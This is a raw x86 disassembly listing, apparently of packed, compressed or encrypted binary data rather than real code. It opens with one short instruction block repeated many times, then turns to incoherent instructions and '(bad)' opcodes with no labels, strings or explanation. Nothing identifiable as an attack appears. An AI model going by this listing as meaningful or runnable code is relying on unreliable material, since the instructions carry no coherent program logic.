  4232c5:	fimul  WORD PTR [ebx]
  4232c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232c8:	push   cs
  4232c9:	push   0xbb55b1b5
  4232ce:	jecxz  0x423270
  4232d0:	add    DWORD PTR [esi],edi
  4232d2:	fimul  WORD PTR [ebx]
  4232d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232d5:	push   cs
  4232d6:	push   0xbb55b1b5
  4232db:	jecxz  0x42327d
  4232dd:	add    DWORD PTR [esi],edi
  4232df:	fimul  WORD PTR [ebx]
  4232e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232e2:	push   cs
  4232e3:	push   0xbb55b1b5
  4232e8:	jecxz  0x42328a
  4232ea:	add    DWORD PTR [esi],edi
  4232ec:	fimul  WORD PTR [ebx]
  4232ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232ef:	push   cs
  4232f0:	push   0xbb55b1b5
  4232f5:	jecxz  0x423297
  4232f7:	add    DWORD PTR [esi],edi
  4232f9:	fimul  WORD PTR [ebx]
  4232fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232fc:	push   cs
  4232fd:	push   0xbb55b1b5
  423302:	jecxz  0x4232a4
  423304:	add    DWORD PTR [esi],edi
  423306:	fimul  WORD PTR [ebx]
  423308:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423309:	push   cs
  42330a:	push   0xbb55b1b5
  42330f:	jecxz  0x4232b1
  423311:	add    DWORD PTR [esi],edi
  423313:	fimul  WORD PTR [ebx]
  423315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423316:	push   cs
  423317:	push   0xbb55b1b5
  42331c:	jecxz  0x4232be
  42331e:	add    DWORD PTR [esi],edi
  423320:	fimul  WORD PTR [ebx]
  423322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423323:	push   cs
  423324:	push   0xbb55b1b5
  423329:	jecxz  0x4232cb
  42332b:	add    DWORD PTR [esi],edi
  42332d:	fimul  WORD PTR [ebx]
  42332f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423330:	push   cs
  423331:	push   0xbb55b1b5
  423336:	jecxz  0x4232d8
  423338:	add    DWORD PTR [esi],edi
  42333a:	fimul  WORD PTR [ebx]
  42333c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42333d:	push   cs
  42333e:	push   0xbb55b1b5
  423343:	jecxz  0x4232e5
  423345:	add    DWORD PTR [esi],edi
  423347:	fimul  WORD PTR [ebx]
  423349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42334a:	push   cs
  42334b:	push   0xbb55b1b5
  423350:	jecxz  0x4232f2
  423352:	add    DWORD PTR [esi],edi
  423354:	fimul  WORD PTR [ebx]
  423356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423357:	push   cs
  423358:	push   0xbb55b1b5
  42335d:	jecxz  0x4232ff
  42335f:	add    DWORD PTR [esi],edi
  423361:	fimul  WORD PTR [ebx]
  423363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423364:	push   cs
  423365:	push   0xbb55b1b5
  42336a:	jecxz  0x42330c
  42336c:	add    DWORD PTR [esi],edi
  42336e:	fimul  WORD PTR [ebx]
  423370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423371:	push   cs
  423372:	push   0xbb55b1b5
  423377:	jecxz  0x423319
  423379:	add    DWORD PTR [esi],edi
  42337b:	fimul  WORD PTR [ebx]
  42337d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42337e:	push   cs
  42337f:	push   0xbb55b1b5
  423384:	jecxz  0x423326
  423386:	add    DWORD PTR [esi],edi
  423388:	fimul  WORD PTR [ebx]
  42338a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42338b:	push   cs
  42338c:	push   0xbb55b1b5
  423391:	jecxz  0x423333
  423393:	add    DWORD PTR [esi],edi
  423395:	fimul  WORD PTR [ebx]
  423397:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423398:	push   cs
  423399:	push   0xbb55b1b5
  42339e:	jecxz  0x423340
  4233a0:	add    DWORD PTR [esi],edi
  4233a2:	fimul  WORD PTR [ebx]
  4233a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233a5:	push   cs
  4233a6:	push   0xbb55b1b5
  4233ab:	jecxz  0x42334d
  4233ad:	add    DWORD PTR [esi],edi
  4233af:	fimul  WORD PTR [ebx]
  4233b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233b2:	push   cs
  4233b3:	push   0xbb55b1b5
  4233b8:	jecxz  0x42335a
  4233ba:	add    DWORD PTR [esi],edi
  4233bc:	fimul  WORD PTR [ebx]
  4233be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233bf:	push   cs
  4233c0:	push   0xbb55b1b5
  4233c5:	jecxz  0x423367
  4233c7:	add    DWORD PTR [esi],edi
  4233c9:	fimul  WORD PTR [ebx]
  4233cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233cc:	push   cs
  4233cd:	push   0xbb55b1b5
  4233d2:	jecxz  0x4233bb
  4233d4:	out    dx,eax
  4233d5:	xor    al,0xde
  4233d7:	and    al,0xa4
  4233d9:	push   cs
  4233da:	js     0x423391
  4233dc:	mov    cl,0x7f
  4233de:	sbb    DWORD PTR [ecx],edi
  4233e0:	shl    DWORD PTR [edi-0x3f],1
  4233e3:	repz xchg ebp,eax
  4233e5:	and    ebx,DWORD PTR [esi-0x7b]
  4233e8:	sbb    DWORD PTR [ecx+0x46],0xf
  4233ec:	jbe    0x4233b4
  4233ee:	jo     0x4233aa
  4233f0:	test   BYTE PTR [eax],bl
  4233f2:	adc    eax,0x55d87eb9
  4233f7:	fistp  QWORD PTR [edx]
  4233f9:	and    eax,0xe1ae638e
  4233fe:	xor    dl,BYTE PTR [edi-0x6c5d26bf]
  423404:	push   ebp
  423405:	pushf  
  423406:	inc    esp
  423407:	sub    BYTE PTR [edi+ebp*2-0x4d],dl
  42340b:	mov    ds:0xa1b53396,al
  423410:	add    BYTE PTR ds:0x1086b8ab,dh
  423416:	shl    DWORD PTR [edi-0x2d163756],1
  42341c:	cdq    
  42341d:	jbe    0x4233f7
  42341f:	out    dx,eax
  423420:	sbb    eax,0x47f37196
  423425:	or     DWORD PTR [edi+eax*8],eax
  423428:	ins    BYTE PTR es:[edi],dx
  423429:	and    cl,al
  42342b:	push   0xffffffa7
  42342d:	xchg   esi,eax
  42342e:	mov    ebp,0x900990b0
  423433:	jl     0x42347e
  423435:	and    bh,BYTE PTR [ecx+0x59d758f8]
  42343b:	sub    cl,BYTE PTR [esi+esi*2]
  42343e:	and    ch,ch
  423440:	push   ebx
  423441:	xor    esp,DWORD PTR [edx-0x30]
  423444:	out    0xe3,eax
  423446:	js     0x4234c5
  423448:	pusha  
  423449:	popa   
  42344a:	call   0xec827ce4
  42344f:	and    DWORD PTR [ebp-0x6],0xc863d6
  423456:	add    eax,0xe09555d5
  42345b:	in     al,dx
  42345c:	mov    edi,0x965292c7
  423461:	xor    BYTE PTR [eax+0x20],dh
  423464:	pop    ebx
  423465:	test   BYTE PTR [ebx-0x66],al
  423468:	pop    edi
  423469:	jmp    0x4234e4
  42346b:	repnz adc DWORD PTR [eax-0x1f],0x1cf4db48
  423473:	pop    ebx
  423474:	mov    DWORD PTR [eax],ebp
  423476:	add    ecx,DWORD PTR es:[edx+0x1f205f28]
  42347d:	test   BYTE PTR [esi+0x40],ch
  423480:	push   0x42d92596
  423485:	pop    esi
  423486:	test   al,0x42
  423488:	add    al,0x53
  42348a:	(bad)  
  42348b:	cmc    
  42348c:	test   BYTE PTR [ebx-0x77],ah
  42348f:	fs ins BYTE PTR es:[edi],dx
  423491:	dec    edi
  423492:	aas    
  423493:	adc    bh,BYTE PTR ds:0xc89f9a7b
  423499:	xlat   BYTE PTR ds:[ebx]
  42349a:	lea    ecx,ds:0x127bbd07
  4234a0:	repnz imul esi,DWORD PTR [edi],0xffffffbe
  4234a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234a5:	sbb    al,0x4
  4234a7:	sar    DWORD PTR [edi+0x32],cl
  4234aa:	pop    esp
  4234ab:	xchg   DWORD PTR [ebp+0x36],ebx
  4234ae:	or     ecx,DWORD PTR [ecx+esi*4+0x5fa523e3]
  4234b5:	jo     0x423513
  4234b7:	stc    
  4234b8:	cwde   
  4234b9:	and    DWORD PTR [ecx+ebp*8+0x74],ebp
  4234bd:	and    al,0xca
  4234bf:	in     eax,dx
  4234c0:	js     0x423492
  4234c2:	jecxz  0x4234e9
  4234c4:	xor    esp,DWORD PTR [esi]
  4234c6:	jne    0x4234af
  4234c8:	dec    ecx
  4234c9:	dec    ebx
  4234ca:	adc    bl,dl
  4234cc:	sbb    ch,0x50
  4234cf:	(bad)  
  4234d0:	pop    ebp
  4234d1:	shl    DWORD PTR [ebx+0x7a241b30],cl
  4234d7:	ret    
  4234d8:	pop    ds
  4234d9:	inc    ebx
  4234da:	fld    QWORD PTR [edi+ecx*4+0x6bf0a7a5]
  4234e1:	frstor [di-0x5911]
  4234e6:	adc    eax,0x8f520d49
  4234eb:	mov    edi,0x2ac49b2b
  4234f0:	iret   
  4234f1:	mov    dl,BYTE PTR [ecx+0x7b]
  4234f4:	in     eax,0x95
  4234f6:	dec    ebx
  4234f7:	sbb    ebx,edi
  4234f9:	pop    ebx
  4234fa:	mov    ds:0x5ce17be8,al
  4234ff:	mul    DWORD PTR [ebx-0xb92746]
  423505:	or     al,0xac
  423507:	or     BYTE PTR [eax-0x60d59be],bh
  42350d:	pop    es
  42350e:	cmp    eax,DWORD PTR [ecx]
  423510:	pop    ebx
  423511:	and    bl,BYTE PTR [esi]
  423513:	test   esp,eax
  423515:	mov    edi,0xf755ba5a
  42351a:	std    
  42351b:	or     BYTE PTR [esp+eiz*8],cl
  42351e:	pop    esp
  42351f:	rcr    ebp,0x41
  423522:	pop    ebx
  423523:	mov    bh,0xdf
  423525:	mov    ch,0x44
  423527:	xchg   ebx,eax
  423528:	xor    edi,ecx
  42352a:	xor    eax,ebx
  42352c:	and    eax,DWORD PTR [esi+0x4c]
  42352f:	sub    ebx,DWORD PTR ds:0x17f61e12
  423535:	ins    BYTE PTR es:[edi],dx
  423536:	retf   0x98c0
  423539:	test   DWORD PTR [esi],edx
  42353b:	inc    eax
  42353c:	arpl   WORD PTR [esi+0x3],bx
  42353f:	sbb    BYTE PTR [ebx-0x4a],dl
  423542:	mov    cl,0xb8
  423544:	aas    
  423545:	loop   0x4235aa
  423547:	pop    es
  423548:	out    dx,al
  423549:	pop    eax
  42354a:	daa    
  42354b:	lock push ecx
  42354d:	xchg   esp,eax
  42354e:	mov    eax,ds:0xcf55ed65
  423553:	dec    eax
  423554:	retf   
  423555:	test   DWORD PTR [edx-0x1b],ecx
  423558:	jns    0x4234f6
  42355a:	or     ebx,DWORD PTR [ebp-0xe]
  42355d:	jmp    0x4ac2:0x880c440e
  423564:	inc    esi
  423565:	jno    0x4235e1
  423567:	dec    esp
  423568:	in     al,0xa0
  42356a:	and    ah,BYTE PTR [eax+0x5c]
  42356d:	cld    
  42356e:	or     ch,BYTE PTR [eax+0x32]
  423571:	cmp    al,0x2a
  423573:	push   eax
  423574:	mov    DWORD PTR [bx],esp
  423577:	push   ss
  423578:	inc    edi
  423579:	iret   
  42357a:	aad    0x22
  42357c:	stc    
  42357d:	sub    DWORD PTR [ebx],edx
  42357f:	aad    0x25
  423581:	out    0x84,al
  423583:	retf   
  423584:	mov    esp,0xe2b160b7
  423589:	xor    al,0xfd
  42358b:	je     0x423525
  42358d:	(bad)  
  42358e:	sub    eax,0xad42b3e
  423593:	fs inc edx
  423595:	pop    es
  423596:	inc    edi
  423597:	mov    edx,0xbf823a4a
  42359c:	dec    esi
  42359d:	js     0x42359e
  42359f:	pop    ss
  4235a0:	test   eax,0x99951ba6
  4235a5:	nop
  4235a6:	push   0x5624e5bc
  4235ab:	(bad)  
  4235ac:	xor    ebx,DWORD PTR es:[edx+0x42]
  4235b0:	clc    
  4235b1:	lock mov dl,0xfc
  4235b4:	sbb    al,ah
  4235b6:	and    BYTE PTR [eax-0x63430702],ah
  4235bc:	cmp    eax,0x24af5b18
  4235c1:	inc    eax
  4235c2:	push   ebp
  4235c3:	(bad)  
  4235c4:	fnsave [ecx]
  4235c6:	mov    ecx,0xde221005
  4235cb:	pop    edx
  4235cc:	jmp    FWORD PTR [ebp+0x565214c6]
  4235d2:	cld    
  4235d3:	xchg   BYTE PTR [esi],al
  4235d5:	mov    ah,0xe8
  4235d7:	sub    BYTE PTR [ebp+ebp*1-0x1e2e371],0xc9
  4235df:	xor    BYTE PTR [edi+0x365ec0da],bh
  4235e5:	sar    ch,0x96
  4235e8:	leave  
  4235e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235ea:	std    
  4235eb:	inc    edx
  4235ec:	adc    eax,0x56a7f189
  4235f1:	cwde   
  4235f2:	mov    bl,BYTE PTR [edx]
  4235f4:	or     al,0xca
  4235f6:	mov    edx,0xb2da26ef
  4235fb:	lea    ecx,[esi+edi*2-0x85f0ac0]
  423602:	int3   
  423603:	jl     0x42367c
  423605:	mov    BYTE PTR [ecx-0x5f],al
  423608:	mov    ecx,0xacf6d8d2
  42360d:	std    
  42360e:	mov    esp,0xd8a4c8af
  423613:	sbb    bl,bl
  423615:	(bad)  
  423616:	int3   
  423617:	fnstcw WORD PTR [ecx-0x29]
  42361a:	out    0x49,eax
  42361c:	imul   ebx,DWORD PTR [edx],0x15589a8a
  423622:	inc    eax
  423623:	sub    DWORD PTR [edi-0x2a],0xffffff98
  423627:	lods   eax,DWORD PTR ds:[esi]
  423628:	out    dx,al
  423629:	jge    0x4235b2
  42362b:	cmp    eax,0x5ccaf652
  423630:	mov    eax,ds:0x8628909a
  423635:	xchg   BYTE PTR [ecx],dl
  423637:	loop   0x423684
  423639:	and    edx,ebp
  42363b:	sbb    al,0x9e
  42363d:	hlt    
  42363e:	daa    
  42363f:	ins    BYTE PTR es:[edi],dx
  423640:	call   0xc3e015f7
  423645:	xchg   edi,eax
  423646:	aas    
  423647:	(bad)  
  423648:	pop    edx
  423649:	gs stos DWORD PTR es:[edi],eax
  42364b:	loopne 0x423691
  42364d:	push   esp
  42364e:	xchg   DWORD PTR [edx-0x76],edi
  423651:	cmp    DWORD PTR [eax+0x39],edx
  423654:	jnp    0x42368d
  423656:	in     eax,0x8b
  423658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423659:	lea    edx,[eax-0x1624f66a]
  42365f:	xor    eax,DWORD PTR [esi+0x7c]
  423662:	int3   
  423663:	xchg   edi,eax
  423664:	cmp    al,0xb9
  423666:	call   0xc5fb:0x89de2d17
  42366d:	dec    ebx
  42366e:	cmp    dh,al
  423670:	ror    DWORD PTR [ebp-0x3c],cl
  423673:	and    al,0x44
  423675:	push   ds
  423676:	fisub  DWORD PTR [esi-0x11]
  423679:	es jno 0x423649
  42367c:	js     0x423615
  42367e:	out    0x51,al
  423680:	dec    ebx
  423681:	shr    DWORD PTR [eax+edi*8-0x6c],1
  423685:	adc    eax,0x1af07a5d
  42368a:	mov    ds:0x860a2478,al
  42368f:	pop    esi
  423690:	xchg   ebp,eax
  423691:	mov    ecx,0x33afe2
  423696:	pop    DWORD PTR [esi+0x324340de]
  42369c:	(bad)  [ecx]
  42369e:	shl    BYTE PTR [ebx],0xe9
  4236a1:	inc    ebp
  4236a2:	mov    bh,0x40
  4236a4:	and    al,0xa4
  4236a6:	std    
  4236a7:	sbb    bl,dh
  4236a9:	pushf  
  4236aa:	loope  0x4236c8
  4236ac:	inc    esp
  4236ad:	mov    bl,0x8d
  4236af:	mov    WORD PTR [edi],cs
  4236b1:	dec    esi
  4236b2:	jae    0x4236cb
  4236b4:	inc    esi
  4236b5:	pop    edx
  4236b6:	xor    al,0x8e
  4236b8:	mov    esp,0x66269df8
  4236bd:	call   0x672bcfbd
  4236c2:	cdq    
  4236c3:	sbb    al,0x6b
  4236c5:	dec    esi
  4236c6:	inc    esi
  4236c7:	repnz loop 0x4236a8
  4236ca:	out    dx,eax
  4236cb:	and    cl,bh
  4236cd:	out    0xeb,al
  4236cf:	inc    eax
  4236d0:	loop   0x42369b
  4236d2:	push   ebx
  4236d3:	mov    eax,ds:0xa3b9a5b5
  4236d8:	je     0x4236a0
  4236da:	sbb    al,0xc7
  4236dc:	shl    DWORD PTR [edx+edi*4],cl
  4236df:	das    
  4236e0:	imul   eax,DWORD PTR [edi],0xffffffd3
  4236e3:	mov    bh,BYTE PTR [ecx+0xc]
  4236e6:	js     0x42368b
  4236e8:	jge    0x4236bf
  4236ea:	pop    ebx
  4236eb:	mov    bh,cl
  4236ed:	mov    ds:0x8a705c62,al
  4236f2:	pop    ecx
  4236f3:	xchg   DWORD PTR [esi+eax*1-0x275cd3e5],ebx
  4236fa:	mov    eax,0xa41f99c4
  4236ff:	(bad)  
  423700:	jmp    0x4236bb
  423702:	inc    edx
  423703:	std    
  423704:	add    eax,0xc4278ebf
  423709:	inc    esi
  42370a:	inc    eax
  42370b:	cmp    al,0xb2
  42370d:	jno    0x423752
  42370f:	push   ebx
  423710:	push   ebx
  423711:	fwait
  423712:	inc    esi
  423713:	cmp    cl,dh
  423715:	test   eax,ebx
  423717:	mov    ds:0x9330f82b,eax
  42371c:	push   esi
  42371d:	inc    esi
  42371e:	mov    cl,ch
  423720:	outs   dx,DWORD PTR ds:[esi]
  423721:	jecxz  0x42376e
  423723:	dec    al
  423725:	gs pop ebp
  423727:	leave  
  423728:	sub    BYTE PTR [eax+0x5818604d],0x12
  42372f:	scas   al,BYTE PTR es:[edi]
  423730:	adc    eax,0xff10e95e
  423735:	test   al,0x7e
  423737:	shl    ah,cl
  423739:	outs   dx,DWORD PTR ds:[esi]
  42373a:	dec    esi
  42373b:	sub    ah,ch
  42373d:	dec    esp
  42373e:	jmp    0x8ba4:0x9ddf18b5
  423745:	add    DWORD PTR [ebp+0x2b],ebx
  423748:	jno    0x4236e5
  42374a:	add    eax,DWORD PTR [ebp-0x1b]
  42374d:	cmp    BYTE PTR [eax+0x37],dh
  423750:	jp     0x423738
  423752:	mov    DWORD PTR [esi],0xbfc66004
  423758:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423759:	xchg   BYTE PTR [edi-0x4b],al
  42375c:	jae    0x42374a
  42375e:	data16 (bad) 
  423760:	(bad)  
  423761:	loopne 0x42374d
  423763:	lods   al,BYTE PTR ds:[esi]
  423764:	or     ebx,0x12
  423767:	rol    BYTE PTR [edx-0x48e04866],1
  42376d:	or     DWORD PTR [edi+0x50],0x2405c9be
  423774:	pusha  
  423775:	xchg   esp,eax
  423776:	loop   0x423732
  423778:	mov    ebp,0x4f0506bb
  42377d:	(bad)  
  42377e:	out    dx,al
  42377f:	or     dh,BYTE PTR [edx+0x42]
  423782:	scas   al,BYTE PTR es:[edi]
  423783:	push   edx
  423784:	push   0x9b1c0c20
  423789:	add    esp,DWORD PTR [esp+ecx*4+0x42]
  42378d:	lea    edx,[ecx-0x67]
  423790:	mov    esi,0xc03cf7e8
  423795:	xor    al,0x11
  423797:	push   ds
  423798:	adc    esi,ecx
  42379a:	imul   eax,DWORD PTR [ebx+0x67],0x72c429e5
  4237a1:	push   cs
  4237a2:	pop    ebx
  4237a3:	cmc    
  4237a4:	ins    BYTE PTR es:[edi],dx
  4237a5:	sub    esi,DWORD PTR [ebx]
  4237a7:	cmp    DWORD PTR ds:0xe1914aa3,ebx
  4237ad:	jb     0x4237f7
  4237af:	push   0x3962857
  4237b4:	add    al,BYTE PTR [eax-0x3c]
  4237b7:	gs ret 0xf71f
  4237bb:	push   ds
  4237bc:	fcomp  QWORD PTR [eax-0x1b]
  4237bf:	sub    edi,DWORD PTR [ecx]
  4237c1:	ficom  WORD PTR [eax]
  4237c3:	mov    cl,0x9b
  4237c5:	out    0xb9,eax
  4237c7:	scas   eax,DWORD PTR es:[edi]
  4237c8:	jnp    0x423832
  4237ca:	jno    0x4237d7
  4237cc:	cmp    eax,0x26f0dff4
  4237d1:	mov    eax,ds
  4237d3:	adc    dh,dh
  4237d5:	push   ebx
  4237d6:	mov    ah,0xe5
  4237d8:	sub    DWORD PTR [eax],ebp
  4237da:	pop    ss
  4237db:	xchg   esi,eax
  4237dc:	stos   BYTE PTR es:[edi],al
  4237dd:	not    DWORD PTR [esi]
  4237df:	sbb    al,0x10
  4237e1:	xor    ah,ah
  4237e3:	xchg   ebp,eax
  4237e4:	int3   
  4237e5:	loopne 0x42380f
  4237e7:	mov    al,ds:0x229238ab
  4237ec:	xor    al,0xf3
  4237ee:	jl     0x42385a
  4237f0:	stos   DWORD PTR es:[edi],eax
  4237f1:	nop
  4237f2:	das    
  4237f3:	mov    ds,WORD PTR [edi-0x70]
  4237f6:	pusha  
  4237f7:	sub    al,0x44
  4237f9:	(bad)  
  4237fa:	fisubr WORD PTR ds:0xcb3f4e0a
  423800:	out    dx,eax
  423801:	pop    es
  423802:	sbb    BYTE PTR [edi+0x54],dh
  423805:	enter  0xb3d0,0xb7
  423809:	popa   
  42380a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42380b:	pop    esp
  42380c:	push   es
  42380d:	and    ch,BYTE PTR [edi]
  42380f:	pop    edx
  423810:	dec    ebp
  423811:	aaa    
  423812:	cmp    al,0x29
  423814:	fst    DWORD PTR ss:[ecx]
  423817:	mov    ebx,DWORD PTR [edx]
  423819:	stos   DWORD PTR es:[edi],eax
  42381a:	cld    
  42381b:	leave  
  42381c:	mov    ecx,DWORD PTR [ecx+0x15]
  42381f:	rcl    DWORD PTR [edx+ecx*8+0x5b545a09],1
  423826:	lock test DWORD PTR [esp+ebp*1],0xd056b4b
  42382e:	mov    cl,0x70
  423830:	add    dl,BYTE PTR [ebp-0x6]
  423833:	leave  
  423834:	push   cs
  423835:	add    BYTE PTR [ebx],ah
  423837:	test   eax,0x83600bda
  42383c:	loopne 0x423885
  42383e:	sbb    dh,bh
  423840:	and    DWORD PTR [esi+esi*1+0x6c],ebx
  423844:	js     0x4237f6
  423846:	push   cs
  423847:	mov    ds:0xf8e3b997,eax
  42384c:	cmp    DWORD PTR [eax+0x550daac9],0x6af6cc47
  423856:	adc    eax,edi
  423858:	jle    0x4238c6
  42385a:	jecxz  0x423845
  42385c:	ror    BYTE PTR [ebx+esi*4+0x671bb113],0xd7
  423864:	jl     0x42381a
  423866:	adc    DWORD PTR [ebx+0x136e1d56],esi
  42386c:	xlat   BYTE PTR ds:[ebx]
  42386d:	loop   0x42381f
  42386f:	je     0x423876
  423871:	ret    
  423872:	mov    ds:0x9fbc1f7b,al
  423878:	sbb    BYTE PTR [edx+ebp*1],0xbd
  42387c:	push   cs
  42387d:	test   DWORD PTR [edi+0x5988c1fc],ebx
  423883:	fsubr  st,st(3)
  423885:	mov    edx,DWORD PTR [edi+edi*8+0xe]
  423889:	cdq    
  42388a:	jp     0x4238e3
  42388c:	arpl   WORD PTR [ebx+0x4144acba],ax
  423892:	imul   eax,DWORD PTR ds:[ebx],0xfffffffd
  423896:	and    DWORD PTR [edi],esp
  423898:	cdq    
  423899:	mov    ?,WORD PTR [eax+edx*4-0x15]
  42389d:	dec    ebx
  42389e:	in     al,dx
  42389f:	adc    BYTE PTR [ebx+eiz*4],ah
  4238a2:	popf   
  4238a3:	or     al,0x34
  4238a5:	adc    BYTE PTR [eax+0x7c6e19b0],dh
  4238ab:	daa    
  4238ac:	mov    ch,0xf1
  4238ae:	iret   
  4238af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238b0:	mov    edi,0xd96a7760
  4238b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238b6:	mov    ch,0x8e
  4238b8:	mov    cl,0xec
  4238ba:	push   ecx
  4238bb:	ror    ebx,0x37
  4238be:	xor    DWORD PTR [edi-0x4f],ecx
  4238c1:	xchg   edi,eax
  4238c2:	shr    BYTE PTR [edi],0xc7
  4238c5:	out    dx,eax
  4238c6:	bound  edi,QWORD PTR ds:0x391c6256
  4238cc:	mov    dh,0x6d
  4238ce:	test   al,0xf3
  4238d0:	push   eax
  4238d1:	mov    WORD PTR [ecx],fs
  4238d3:	jo     0x423953
  4238d5:	push   ebp
  4238d6:	or     ch,BYTE PTR ds:0xb6ea92b0
  4238dc:	popf   
  4238dd:	jmp    0x423870
  4238df:	mov    eax,ds:0xe93f973c
  4238e4:	add    eax,edx
  4238e6:	cdq    
  4238e7:	inc    ebx
  4238e8:	or     BYTE PTR ds:0xd019b34,al
  4238ee:	dec    eax
  4238ef:	adc    al,0xff
  4238f1:	aam    0x13
  4238f3:	scas   al,BYTE PTR es:[edi]
  4238f4:	push   cs
  4238f5:	jnp    0x423967
  4238f7:	arpl   bx,bp
  4238f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238fa:	and    DWORD PTR [eax],eax
  4238fc:	mov    edi,0xa13c7c09
  423901:	push   0x951eca47
  423906:	js     0x4238cc
  423908:	or     ch,BYTE PTR [esi]
  42390a:	js     0x42397b
  42390c:	pop    ds
  42390d:	cmp    al,BYTE PTR [eax]
  42390f:	jnp    0x423956
  423911:	or     cl,ch
  423913:	or     edi,DWORD PTR [ebp-0x45]
  423916:	(bad)  
  423918:	mov    ch,0x29
  42391a:	jae    0x423952
  42391c:	daa    
  42391d:	jno    0x4238b0
  42391f:	fwait
  423920:	adc    al,0xab
  423922:	(bad)  
  423923:	or     eax,0xd3636700
  423928:	mov    dh,0xc9
  42392a:	jb     0x423926
  42392c:	sub    edx,ebp
  42392e:	and    al,0xed
  423930:	push   cs
  423931:	ss inc ebx
  423933:	scas   al,BYTE PTR es:[edi]
  423934:	and    BYTE PTR [edx-0x2],bh
  423937:	mov    edx,DWORD PTR [ecx-0x49]
  42393a:	pop    ss
  42393b:	pop    eax
  42393c:	dec    eax
  42393d:	pop    ecx
  42393e:	sub    DWORD PTR [ebp+0x16],esi
  423941:	loope  0x42394e
  423943:	add    eax,0x417706dc
  423948:	adc    eax,0x770170e3
  42394d:	(bad)  
  42394e:	push   ds
  42394f:	imul   ecx,DWORD PTR [eax+edx*4-0x725c076a],0xffffffe8
  423957:	push   ds
  423958:	ds lahf 
  42395a:	aaa    
  42395b:	jp     0x4239ce
  42395d:	lock or ch,cl
  423960:	enter  0x6e06,0xd2
  423964:	jb     0x423933
  423966:	lahf   
  423967:	aas    
  423968:	repnz mov ebp,?
  42396b:	or     eax,0x5096e144
  423970:	fldcw  WORD PTR [ebp+0x5f404739]
  423976:	xchg   esp,eax
  423977:	dec    ebp
  423978:	inc    ebp
  423979:	jno    0x423968
  42397b:	sahf   
  42397c:	or     eax,0x5494db0e
  423981:	mov    ah,0xd4
  423983:	je     0x423985
  423985:	adc    DWORD PTR [eax-0x20],ebx
  423988:	dec    edx
  423989:	addr16 jo 0x4239ca
  42398c:	push   ecx
  42398d:	push   ebx
  42398e:	pop    edi
  42398f:	mov    WORD PTR [edx-0x7f3dd73d],es
  423995:	retf   
  423996:	push   ss
  423997:	mov    WORD PTR [edi],ss
  423999:	push   edx
  42399a:	out    dx,eax
  42399b:	popf   
  42399c:	sub    al,0x23
  42399e:	pop    edi
  42399f:	jl     0x42397d
  4239a1:	mov    WORD PTR [esi+0x1bc0749a],es
  4239a7:	ja     0x4239d2
  4239a9:	aas    
  4239aa:	mov    DWORD PTR [edx],0x11b3520b
  4239b0:	xor    esp,esp
  4239b2:	lods   al,BYTE PTR ds:[esi]
  4239b3:	shl    DWORD PTR [ebp-0x622fec55],0xfd
  4239ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239bb:	dec    esi
  4239bc:	lea    ecx,[ebp-0x7aff12aa]
  4239c2:	xchg   ebp,eax
  4239c3:	mov    ebp,0xdff72bd1
  4239c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239c9:	add    DWORD PTR [edi],edi
  4239cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239cc:	jne    0x423a40
  4239ce:	sbb    eax,DWORD PTR [ebx]
  4239d0:	xchg   ebp,eax
  4239d1:	jnp    0x423a48
  4239d3:	adc    ch,BYTE PTR ds:0x49edbdb2
  4239d9:	cmc    
  4239da:	(bad)  
  4239db:	aad    0x75
  4239dd:	leave  
  4239de:	or     ch,BYTE PTR [edi+0x46d10395]
  4239e4:	xchg   ecx,eax
  4239e5:	(bad)  
  4239e6:	out    0x36,eax
  4239e8:	aam    0x88
  4239ea:	in     eax,0x93
  4239ec:	push   ds
  4239ed:	cmc    
  4239ee:	ret    0xfe64
  4239f1:	jo     0x423a5e
  4239f3:	pop    ss
  4239f4:	inc    esi
  4239f5:	mov    al,ds:0xfb669cd7
  4239fa:	mov    ch,al
  4239fc:	inc    ecx
  4239fd:	adc    bl,BYTE PTR ds:0x51f7d1c4
  423a03:	ficom  WORD PTR [edi+edx*2]
  423a06:	div    bl
  423a08:	sbb    ecx,DWORD PTR [ebx]
  423a0a:	jle    0x4239e1
  423a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a0d:	(bad)  
  423a0e:	cmc    
  423a0f:	mov    al,ds:0xc007da1
  423a14:	push   ds
  423a15:	mov    dh,0x15
  423a17:	retf   0x1bdb
  423a1a:	leave  
  423a1b:	sbb    BYTE PTR [eax-0x3ff2a4a8],0x43
  423a22:	stc    
  423a23:	jp     0x423a8a
  423a25:	rcl    ecx,0x7e
  423a28:	inc    esi
  423a29:	push   es
